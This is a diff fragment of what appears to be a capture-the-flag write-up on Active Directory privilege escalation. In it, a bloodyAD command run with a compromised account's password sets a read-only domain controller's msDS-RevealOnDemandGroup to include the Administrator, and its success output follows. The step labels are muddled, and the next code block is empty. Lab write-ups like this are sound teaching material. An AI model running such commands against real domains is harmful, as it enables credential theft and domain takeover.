@@ -552,5 +552,13 @@ Just like the post above suggests there is a built in group called `RODC adminis
 Ill start by clearing the deny list, this is becuase if a user is in both the allow and deny list, the deny list will take priority and the administrator account is in the deny list by default
 
 ```python
+❯❯❯ bloodyAD --host dc01.garfield.htb -d garfield.htb -u 'l.wilson_adm' -p 'Password123!' set object 'CN=RODC01,OU=DOMAIN CONTROLLERS,DC=GARFIELD,DC=HTB' msDS-RevealOnDemandGroup -v 'CN=ADMINISTRATOR,CN=USERS,DC=GARFIELD,DC=HTB'            
+[+] CN=RODC01,OU=DOMAIN CONTROLLERS,DC=GARFIELD,DC=HTB's msDS-RevealOnDemandGroup has been updated
+```
+
+Then ill add the administrator account to the allow list
+
+```python
 
 ```
+
